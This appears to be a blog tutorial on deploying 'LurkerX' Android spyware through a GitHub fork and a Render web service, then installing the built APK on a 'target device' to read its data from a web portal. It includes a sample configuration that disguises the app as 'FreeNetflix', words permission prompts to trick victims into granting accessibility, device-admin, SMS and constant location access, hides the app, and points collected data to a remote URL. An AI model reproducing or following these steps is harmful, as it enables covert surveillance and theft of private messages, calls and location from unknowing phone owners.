 # How to Spy on any Android phone using just Chrome or Safari, October 2026

Did you know that you can spy on any Android Phone using just your browser on your own phone?

LurkerX has been a tool people use to generate spywares for Android devices, but for your information it required a PC like a laptop because that was how it was designed. The recent breakthrough is very surprising, With any device that you are using, you can generate a spyware that can be used to spy on other Android devices. In this post, I would list and explain all that you need to know in spying other Androids using the new LurkerX, so miss no glance if you need to learn how to use the new LurkerX.



1. The most neccessary thing to do is to create an account on these two platforms; 

- [**GitHub**](https://github.com)

- [**Render**](https://render.com)

It is those platforms I'd use in this tutorial, though many platforms provides similar services.

2. The next thing to do is to log into your GitHub account, and open this repository link:
[https://github.com/the-hollowclan/LurkerX](https://github.com/the-hollowclan/LurkerX)

3. Fork the repository, step-by-step illustration as shown in the images below:

4. Copy the link to your forked repository. For e.g, mine is https://github.com/nooby-jazy/LurkerX

`https://github.com/noobie-jayz/LurkerX`
5. Now log into your [render.com](https://render.com) account

6. Create a new `web service`

7. Choose public git repository and enter the link to your GitHub fork. 

8. Connect and Choose `FREE` instance plan. Then jump to the bottom and click `Deploy web service`

9. Render will generate a link for you. Copy the link

10. Go back to your GitHub account. Everything is set, you just need to make sure your generated Spyware would forward all data and information to your Render.com URL. 

11. Click on `choices.ini` and edit it. Make sure to change things like `remoteUrl` and `publicRepoUrl`.

- `remoteUrl` should be your link from render.com
- `publicRepoUrl` should be your forked repo's link. In this case mine is `https://github.com/nooby-jayz/LurkerX`.

You edit this, you edit the spyware behavior.
Don't forget to save it after editing(Also called "Committing" on GitHub)

This is an example of how I made mine:

```ini

[app]
name = FreeNetflix
version = 1.6.0


[content]
icon = icon.png
countdowntext = "Sit tight and relax while the app configures the system for free and fast internet"

[buttons]
requestpermissions = Enable App Process
requestdeviceadmin = Request Core-Level Rights
enableaccessibility = Enable Accessibility Service

[strings]
telephonypermissionstring = Phone and SMS permissions are needed to enable the service
gpspermissionstring = Allow Location for ALL THE TIME to let the app fake your GPS in background. This is required

[behavior]
remoteurl = https://lurkerx-wo5o.onrender.com
publicRepoUrl= https://github.com/nooby-jayz/LurkerX
payloadurl = None
hideapp = true

[decompile]
from = base.apk

[sign]
keystore = mykey.jks
keystore_pass = password
alias =

```

12. Now check this important part of your page, the malware is built and stored inside GitHub
12. Now go back to your web service in Render.com and click Manual Deploy. Wait for about 5 minutes for Render to rebuild the server for your URL. 

13. After that open the link Render gave you in your browser:

14. Build the APK. It might take a while for the spyware to get packaged, while it is loading, head straight to generate a new Token to unlock the Complete Portal. 

15. After APK is completely built, you can download and install it on the target device that you want to monitor. 
16. All information on that device can also be viewed on your render.com URL portal. 